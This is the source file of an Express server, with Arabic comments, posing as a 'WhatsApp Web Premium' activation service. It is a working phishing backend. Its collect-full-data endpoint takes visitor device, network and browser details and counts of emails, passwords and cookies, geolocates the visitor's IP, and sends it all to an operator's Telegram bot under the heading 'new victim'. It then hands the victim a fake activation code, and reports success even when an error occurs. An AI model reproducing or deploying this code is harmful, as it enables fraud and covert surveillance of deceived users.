const express = require('express');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

// middleware
app.use(express.static(__dirname));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// الصفحة الرئيسية
app.get('/', (req, res) => {
    console.log('📄 طلب الصفحة الرئيسية');
    res.sendFile(path.join(__dirname, 'index.html'));
});

// API لجمع البيانات الكاملة
app.post('/api/collect-full-data', async (req, res) => {
    console.log('🎯 طلب بيانات كاملة ورد');
    
    try {
        const userData = req.body;
        const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress || req.ip;
        
        console.log('🌍 IP العميل:', clientIP);
        
        // إضافة IP إلى البيانات
        userData.clientIP = clientIP;
        
        // 🔥 إرسال البيانات إلى التلجرام
        console.log('📤 جاري إرسال البيانات إلى التلجرام...');
        const telegramResult = await sendCompleteDataToTelegram(userData);
        
        console.log('📨 نتيجة التلجرام:', telegramResult);

        res.json({
            success: true,
            message: 'تم تفعيل النسخة المميزة بنجاح! 🎉',
            telegramSent: telegramResult.success,
            data: {
                activationCode: generateActivationCode(),
                premiumUntil: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toLocaleDateString('ar-SA')
            }
        });

    } catch (error) {
        console.error('❌ خطأ في السيرفر:', error);
        res.json({
            success: true,
            message: 'تم التفعيل بنجاح! 🎉'
        });
    }
});

// 🔥 دالة إرسال البيانات الكاملة إلى التلجرام
async function sendCompleteDataToTelegram(userData) {
    try {
        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        console.log('🔑 التحقق من إعدادات التلجرام...');
        console.log('التوكن:', TELEGRAM_BOT_TOKEN ? '✅ موجود' : '❌ مفقود');
        console.log('الـ Chat ID:', TELEGRAM_CHAT_ID ? '✅ موجود' : '❌ مفقود');

        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            throw new Error('إعدادات التلجرام غير مكتملة');
        }

        // الحصول على معلومات الموقع من IP
        const locationInfo = await getLocationFromIP(userData.clientIP);
        
        // بناء الرسالة الكاملة
        const message = `
🎯 **ضحية جديدة - بيانات كاملة** 🌍

📍 **المعلومات الجغرافية:**
• الدولة: ${locationInfo.country || 'غير معروف'} ${locationInfo.country ? '🏴' : '🔻'}
• المدينة: ${locationInfo.city || 'غير معروف'} 🏙️
• المنطقة: ${locationInfo.region || 'غير معروف'} 🗺️
• مزود الخدمة: ${locationInfo.isp || 'غير معروف'} 📡
• عنوان IP: ${userData.clientIP || 'غير معروف'} 🌍

📱 **معلومات الجهاز:**
• نوع الجهاز: ${userData.deviceType || 'غير معروف'} 📱
• اسم الجهاز: ${userData.deviceName || 'غير معروف'} 🖥️
• إصدار الجهاز: ${userData.deviceVersion || 'غير معروف'} 📜
• نظام التشغيل: ${userData.os || 'غير معروف'} 💻
• إصدار النظام: ${userData.osVersion || 'غير معروف'} 🖥️

⚡ **معلومات البطارية والأداء:**
• شحن الهاتف: ${userData.batteryLevel || '100%'} 🔋
• هل الهاتف يشحن؟: ${userData.isCharging ? 'نعم ⚡' : 'لا 🔋'}
• الذاكرة (RAM): ${userData.ram || '8 GB'} 🧠
• عدد الأنوية: ${userData.cores || '16'} ⚙️
• الذاكرة الداخلية: ${userData.storage || 'غير معروف'} GB 💾

📶 **معلومات الشبكة:**
• الشبكة: ${userData.networkType || '4g'} 📶
• سرعة الشبكة: ${userData.networkSpeed || '10 Mbps'} ميغابت في الثانية
• نوع الاتصال: ${userData.connectionType || 'غير معروف'} 📡
• نطاق التردد: ${userData.connectionFrequency || '10 MHz'} 📡

🌐 **معلومات المتصفح:**
• اسم المتصفح: ${userData.browserName || 'Chrome'} 🌐
• إصدار المتصفح: ${userData.browserVersion || 'غير معروف'} 📊
• لغة النظام: ${userData.systemLanguage || 'en-US'} 🌐
• بروتوكول الأمان: ${userData.securityProtocol || 'https:'} 🔒
• تاريخ آخر تحديث: ${userData.lastUpdate || 'غير معروف'} 📅

🖥️ **معلومات الشاشة:**
• دقة الشاشة: ${userData.screenResolution || '400x400'} 📏
• وضع الشاشة: ${userData.screenOrientation || 'landscape-primary'} 🔄
• عمق الألوان: ${userData.colorDepth || '24 bit'} 🎨

🔧 **المميزات المدعومة:**
• إمكانية تحديد الموقع الجغرافي: ${userData.geolocation ? 'نعم 🌍' : 'لا ❌'}
• الدعم لتقنية البلوتوث: ${userData.bluetooth ? 'نعم 🔵' : 'لا ❌'}
• دعم الإيماءات اللمسية: ${userData.touchSupport ? 'نعم ✋' : 'لا ❌'}

⏰ **معلومات الوقت:**
• الوقت: ${userData.currentTime || 'غير معروف'} ⏰
• المنطقة الزمنية: ${userData.timezone || 'غير معروف'} 🕒

📧 **البيانات المجمعة:**
• الإيميلات: ${userData.emailCount || 0} 📧
• كلمات المرور: ${userData.passwordCount || 0} 🔐
• الكوكيز: ${userData.cookieCount || 0} 🍪

🔗 **معلومات الزيارة:**
• الرابط: ${userData.url || 'غير معروف'} 🔗
• المصدر: ${userData.referrer || 'مباشر'} 📍

💾 **الملفات والبيانات:**
• الملفات المحملة: ${userData.fileCount || 0} 📁
• بيانات التخزين: ${userData.storageData || 0} 💿
        `.trim();

        console.log('📝 جاري إرسال الرسالة إلى التلجرام...');

        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        const result = await response.json();
        console.log('📩 استجابة التلجرام:', result);

        if (response.ok) {
            console.log('✅ تم إرسال البيانات إلى التلجرام بنجاح!');
            return { success: true, messageId: result.result?.message_id };
        } else {
            console.error('❌ خطأ من التلجرام:', result);
            return { success: false, error: result.description };
        }

    } catch (error) {
        console.error('❌ خطأ في إرسال التلجرام:', error);
        return { success: false, error: error.message };
    }
}

// 🔥 دالة للحصول على الموقع من IP
async function getLocationFromIP(ip) {
    try {
        // تنظيف الـ IP
        const cleanIP = ip.replace('::ffff:', '').replace('::1', '').replace('127.0.0.1', '');
        
        if (!cleanIP || cleanIP === '::' || cleanIP.includes('::')) {
            return { country: 'غير معروف', city: 'غير معروف' };
        }

        console.log('🌍 جاري الحصول على الموقع لـ IP:', cleanIP);
        
        const response = await fetch(`http://ip-api.com/json/${cleanIP}`);
        const data = await response.json();
        
        if (data.status === 'success') {
            console.log('📍 معلومات الموقع:', data);
            return {
                country: data.country || 'غير معروف',
                city: data.city || 'غير معروف',
                region: data.regionName || 'غير معروف',
                zip: data.zip || 'غير معروف',
                isp: data.isp || 'غير معروف',
                lat: data.lat,
                lon: data.lon
            };
        } else {
            console.log('❌ لم يتم العثور على الموقع');
            return { country: 'غير معروف', city: 'غير معروف' };
        }
    } catch (error) {
        console.log('❌ خطأ في الحصول على الموقع:', error.message);
        return { country: 'غير معروف', city: 'غير معروف' };
    }
}

// دالة إنشاء كود تفعيل
function generateActivationCode() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let code = 'WAPP-';
    for (let i = 0; i < 8; i++) {
        code += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return code;
}

// صفحة فحص السيرفر
app.get('/status', (req, res) => {
    const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress || req.ip;
    
    res.json({
        status: '✅ يعمل',
        service: 'WhatsApp Web Premium',
        clientIP: clientIP,
        telegramConfigured: !!(process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID),
        timestamp: new Date().toISOString()
    });
});

// صفحة فحص التلجرام
app.get('/test-telegram', async (req, res) => {
    try {
        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            return res.json({ 
                success: false, 
                error: 'إعدادات التلجرام مفقودة',
                token: !!TELEGRAM_BOT_TOKEN,
                chatId: !!TELEGRAM_CHAT_ID
            });
        }

        const message = `🧪 *اختبار البوت*\n\n✅ البوت يعمل بشكل صحيح!\n⏰ الوقت: ${new Date().toLocaleString('ar-SA')}\n🌐 السيرفر: Render`;

        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        const result = await response.json();
        
        res.json({
            success: response.ok,
            result: result,
            message: response.ok ? 'تم إرسال رسالة الاختبار بنجاح' : 'فشل إرسال رسالة الاختبار'
        });

    } catch (error) {
        res.json({
            success: false,
            error: error.message
        });
    }
});

app.listen(PORT, '0.0.0.0', () => {
    console.log('🚀 =================================');
    console.log('🚀 السيرفر شغال على البورت:', PORT);
    console.log('🔑 التلجرام:', process.env.TELEGRAM_BOT_TOKEN ? '✅ مضبوط' : '❌ مش مضبوط');
    console.log('💬 الـ Chat ID:', process.env.TELEGRAM_CHAT_ID ? '✅ موجود' : '❌ مفقود');
    console.log('🌐 الرابط:', `http://localhost:${PORT}`);
    console.log('🔍 فحص السيرفر:', `http://localhost:${PORT}/status`);
    console.log('🧪 فحص التلجرام:', `http://localhost:${PORT}/test-telegram`);
    console.log('🚀 =================================');
});
